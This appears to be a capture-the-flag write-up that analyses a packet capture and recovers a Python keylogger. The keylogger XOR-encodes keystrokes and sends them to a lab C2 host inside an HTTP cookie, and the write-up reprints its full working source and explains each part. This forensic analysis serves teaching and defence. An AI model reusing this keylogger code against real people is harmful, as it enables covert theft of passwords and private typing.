# Packed Light — Network Forensics & PCAP Analysis

## Overview

**Packed Light** is a cybersecurity challenge focused on **Network Forensics, PCAP Analysis, and Cryptography**.

The objective was to analyze a short network capture, identify a covert communication channel, recover the exfiltrated data, and decode it.

The investigation revealed suspicious HTTP traffic communicating with a server over **port 8080**. Further analysis uncovered a Python script that was capturing keyboard input and sending the captured characters to a remote server through HTTP cookies.

## Investigation

### 1. Network Traffic Analysis

The investigation started by analyzing the provided PCAP file in Wireshark.

Several open ports were observed, but one connection immediately stood out:

```text
34.41.103.191:8080
```

The challenge description mentioned a suspicious connection to port `8080` occurring at regular intervals, which made this traffic particularly interesting.

Filtering the traffic for port 8080 revealed HTTP communication with:

```text
byte-lotus-hotel.thm:8080
```

---

## 2. Suspicious HTTP Request

One of the HTTP requests contained:

```http
GET / HTTP/1.1
Host: byte-lotus-hotel.thm:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1
Cookie: hotel_sess_state=AA==
```

The custom `User-Agent` was another indicator that the traffic was not generated by a normal browser.

The most interesting field was:

```text
Cookie: hotel_sess_state=AA==
```

The cookie value appeared to be Base64 encoded.

---

## 3. Discovering the Python Script

Further investigation revealed a request for:

```text
/temp/updates.py
```

The server returned a Python script.

The script initially appeared to be a synchronization service, but its functionality revealed something much more suspicious.

The script imported:

```python
import requests
import base64
from pynput import keyboard
```

The use of `pynput.keyboard` indicated that the program was capable of monitoring keyboard input.

---

## 4. Python Script

The recovered script was:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

# Code Analysis

## 1. Importing the libraries

```python
import requests
import base64
from pynput import keyboard
```

Three libraries are imported.

### `requests`

Used to make HTTP requests.

In this case, it is used to send the captured data to the remote server.

### `base64`

Used to encode the encrypted bytes into Base64.

Base64 does not provide encryption. It converts binary data into a representation that can safely be transported as text.

### `pynput.keyboard`

Used to monitor keyboard events.

This is the component responsible for capturing what the user types.

---

## 2. Command and Control URL

```python
C2_URL = "http://byte-lotus-hotel.thm:8080/"
```

This variable defines the remote server that receives the captured information.

The server is acting as a **Command and Control (C2)** endpoint.

The communication takes place over HTTP on port `8080`.

---

## 3. XOR Key

```python
def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2
```

The function constructs the XOR key by joining two strings.

The resulting key is:

```text
H0t3lSt@ff0NlyK3epS3cr3t!
```

This key is later used to transform the captured character before transmission.

---

## 4. XOR Function

```python
def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```

This function performs an XOR operation between the data and the key.

The operation is:

```text
data XOR key
```

The expression:

```python
i % len(key)
```

allows the key to repeat when the data is longer than the key.

In this challenge, each keyboard character is processed individually.

---

## 5. Capturing the Character

```python
def sendltr(character):
    raw_bytes = character.encode('utf-8')
```

The captured character is converted into bytes using UTF-8.

For example:

```text
A
↓
UTF-8
↓
41
```

The resulting bytes are then passed to the XOR function.

---

## 6. Encrypting / Obfuscating the Character

```python
encrypted = xor(raw_bytes, getkey().encode('utf-8'))
```

The character is XORed with the key.

This produces the transformed byte that will be sent over the network.

The important point is that the data is not sent in clear text.

---

## 7. Base64 Encoding

```python
b64_string = base64.b64encode(encrypted).decode('utf-8')
```

The XOR result is then encoded using Base64.

The purpose here is to represent the binary data as text.

The process becomes:

```text
Keyboard input
      ↓
UTF-8
      ↓
XOR
      ↓
Base64
      ↓
HTTP Cookie
```

---

## 8. Hiding the Data in an HTTP Cookie

```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
    "Cookie": f"hotel_sess_state={b64_string}"
}
```

This is one of the most important parts of the challenge.

The encoded character is placed inside:

```text
hotel_sess_state
```

which is an HTTP cookie.

This allows the exfiltrated information to blend into otherwise normal HTTP traffic.

---

## 9. Sending the Data

```python
requests.get(C2_URL, headers=headers, timeout=0.5)
```

The script sends an HTTP GET request to the C2 server.

The captured character is therefore transmitted through the HTTP request headers.

The traffic observed in the PCAP can consequently be represented as:

```text
Victim
  ↓
Keyboard input
  ↓
Keylogger
  ↓
XOR
  ↓
Base64
  ↓
HTTP Cookie
  ↓
C2 Server :8080
```

---

## 10. Handling Keyboard Events

```python
def on_press(key):
    try:
        sendltr(key.char)
```

This function is triggered when a key is pressed.

Normal characters are sent to `sendltr()`.

Special keys are handled separately:

```python
except AttributeError:
    if key == keyboard.Key.space:
        sendltr(" ")
    elif key == keyboard.Key.enter:
        sendltr("\n")
```

This allows the script to capture spaces and Enter key presses as well.

---

## 11. Starting the Keyboard Listener

```python
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

This starts the keyboard listener and keeps the program running.

The result is continuous monitoring of keyboard activity.

# Data Exfiltration Technique

The investigation showed that the captured information was transmitted using the following process:

```text
Keyboard Input
      ↓
Character
      ↓
UTF-8
      ↓
XOR with key
      ↓
Base64
      ↓
hotel_sess_state Cookie
      ↓
HTTP GET
      ↓
C2 Server
```

This is a simple but effective example of hiding small amounts of information inside apparently legitimate web traffic.

---

# Data Recovery

The reverse process was required to recover the original information from the PCAP.

The decoding process was:

```text
HTTP Cookie
      ↓
Extract hotel_sess_state
      ↓
Base64 Decode
      ↓
XOR with the recovered key
      ↓
Original character
      ↓
Reconstruct the message
```

CyberChef was used to assist with the decoding process.

The individual characters were then reconstructed in their original order to recover the exfiltrated information.
